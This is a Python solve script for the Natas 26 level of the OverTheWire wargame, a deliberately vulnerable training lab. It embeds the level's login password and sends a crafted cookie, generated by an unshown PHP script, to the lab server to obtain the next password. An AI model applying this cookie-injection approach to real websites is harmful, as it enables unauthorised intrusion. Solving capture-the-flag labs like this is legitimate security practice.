import requests
from requests.auth import HTTPBasicAuth
import re
import subprocess

pass_reg = '[a-zA-Z0-9]{32}'



def solve():
    auth = HTTPBasicAuth('natas26','oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T')
    cook = {'drawing':subprocess.run(['php', 'natas26.php'], stdout=subprocess.PIPE).stdout.decode('utf-8')}
    param = {'x1':'0','y1':'0','x2':'0','y2':'0'}
    r = requests.get('http://natas26.natas.labs.overthewire.org/', auth=auth, cookies=cook, params=param)   
    print(r.text)
#    print(re.findall(pass_reg, r.text)
if __name__ == '__main__':
    solve()
    

